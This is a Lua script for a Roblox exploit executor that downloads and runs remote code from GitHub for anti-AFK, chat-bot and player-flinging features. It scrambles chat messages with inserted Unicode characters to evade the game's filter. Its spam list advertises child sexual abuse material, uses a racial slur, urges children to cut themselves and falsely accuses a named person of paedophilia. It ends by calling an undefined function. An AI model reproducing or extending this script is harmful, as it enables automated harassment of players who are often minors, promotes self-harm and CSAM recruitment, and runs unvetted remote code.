-- 1. Anti-AFK
local function runAFK()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/hassanxzayn-lua/Anti-afk/main/antiafkbyhassanxzyn"))()
end

-- 2. Bypass & Configuration
local function runBypass()
    -- This logic "scrambles" the text so the bot sends bypassed messages
    local SpecialCharacter = utf8.char(0x060D)
    local function utf8_chars(str)
        local chars = {}
        for _, c in utf8.codes(str) do table.insert(chars, utf8.char(c)) end
        return chars
    end
    local function utf8_reverse(str)
        local chars = utf8_chars(str)
        local rev = {}
        for i = #chars, 1, -1 do table.insert(rev, chars[i]) end
        return table.concat(rev)
    end
    local function Convert(Text)
        local Reverse = utf8_reverse(Text)
        local New = {}
        for Word in Reverse:gmatch("%S+") do
            local Letters = utf8_chars(Word)
            local Fill = SpecialCharacter .. table.concat(Letters, SpecialCharacter)
            table.insert(New, Fill)
        end
        return table.concat(New, " ")
    end

    local Raw = {
        "Join for CP/pfYQ9rtdcy",
        "If you want to see a expose of Kiceba then join /pfYQ9rtdcy",
        "THIS GAME IS OWNED BY NIGGERS /pfYQ9rtdcy",
        "/pfYQ9rtdcy. Bots run by YBRATS",
        "JOIN 4 CP /pfYQ9rtdcy",
        "KIDS CUT WRISTS FOR US /pfYQ9rtdcy",
        "Draw blood for US /pfYQ9rtdcy",
        "I hope your hiatus was fun /pfYQ9rtdcy",
        "Baptize Me /pfYQ9rtdcy",
        "KICEBA LIKES CHILDREN /pfYQ9rtdcy",
        "JOIN UP /pfYQ9rtdcy",
        "JOIN PLS /pfYQ9rtdcy"
    }

    local Bypassed = {}
    for _, v in ipairs(Raw) do table.insert(Bypassed, Convert(v)) end

    -- This passes the scrambled phrases to the loadstrings below
    getgenv().BotConfig = { DefaultPhrases = { Bypassed } }
    getgenv().Blacklist = { blacklistt = {{}} }
    
    -- Keep the bypass loadstring here
    loadstring(game:HttpGet("https://raw.githubusercontent.com/pemenbkurtis-lang/roblox.mythuuuu/refs/heads/main/bypass.lua"))()
end

-- 3. The Features (All as loadstrings)
local function runFeatures()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/pemenbkurtis-lang/roblox.mythuuuu/refs/heads/main/Bot.lua"))()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/pemenbkurtis-lang/roblox.mythuuuu/refs/heads/main/Fling.lua"))()
end

-- Execution
task.spawn(runBypass)
task.wait(1)
task.spawn(runAFK)
task.spawn(runFeatures)

-- Run immediately

task.spawn(InitializeBypass)
